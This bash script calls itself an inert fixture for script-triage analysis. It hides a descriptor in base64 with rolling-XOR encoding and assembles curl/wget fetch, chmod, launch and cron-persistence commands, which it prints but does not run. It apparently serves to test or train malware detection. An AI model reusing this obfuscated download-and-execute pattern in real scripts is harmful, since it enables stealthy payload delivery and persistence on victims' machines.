#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_8be67964='x/rLt8Sw1aXW65vphuCJ5YDft9ir3/OS8YD1nO6L1KbDrsG10PyL+ZDkgd640b3Y9Jf/nvCX8q3Ar8uuguaP/IztmfqSzb3PoMOm1abau9++zrrfrZDzhvSYx6bUt9+A5ofrh+WE54zwg/eW8ZTLqMey3KiVoNy/3rPDosuswp30kK3Or8Ky07rds576zvaSqsytyPrCvsu51eiA9IDwg7mWud3p0bWN64rv3eXLrta32qrGo43kivyd8Zj80+fV4Ni6je/a9Ifvk+aV8ILdvNu+0KSZ0aTKvsyp2qnlhObJrZmhxf2b+p+tlemP5orvsMCh1b2Ar9u2xumB9JrunPmK+dS31rXduJe5yr7fuN3wlKCY/MSiw6aUrNCxw6DIl+eV+pj9wLXbuteyn/KO/ZjqnPWW86zCo86rluOT95bih6rO+sKmnviZ/M722KvOvMqjwKXZusinyZbmh/ObponsmPvUt8WqxOqOodSkwKHVsJ35zfWRqc+uy/nB'
  readonly Codec_8be67964='base64_literal|rolling_xor|b1'

  Load_8be67964() {
    EnCoDeD_Bytes=()
    local PaRt
    while read -r PaRt; do [[ -n "$PaRt" ]] && EnCoDeD_Bytes+=("$PaRt"); done < <(printf '%s' "${Material_8be67964}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
  }

  Decode_8be67964() {
    DeCoDeD_Bytes=()
    local PrEvIoUs=177
    local InDeX
    for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
      DeCoDeD_Bytes+=("$((EnCoDeD_Bytes[InDeX] ^ PrEvIoUs))")
      PrEvIoUs=${EnCoDeD_Bytes[InDeX]}
    done
  }

  Recover_8be67964() {
    local -a EnCoDeD_Bytes DeCoDeD_Bytes
    local DeScRiPtOr_Text NeUtRaL PaSs InDeX
    NeUtRaL=$((19 * 7 - 133))
    Load_8be67964
    local decode_target=Decode_8be67964; "$decode_target"
    DeScRiPtOr_Text=''
    local octal character
    for InDeX in "${!DeCoDeD_Bytes[@]}"; do
      printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
      printf -v character '%b' "\\$octal"
      DeScRiPtOr_Text+="$character"
    done
    printf '%s\n' "$DeScRiPtOr_Text"
  }

  Inspect_8be67964() { local recovered; recovered="$(Recover_8be67964)"; printf '%s\n' "$recovered"; }

  Plan_8be67964() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_8be67964)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
    declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_8be67964; fi
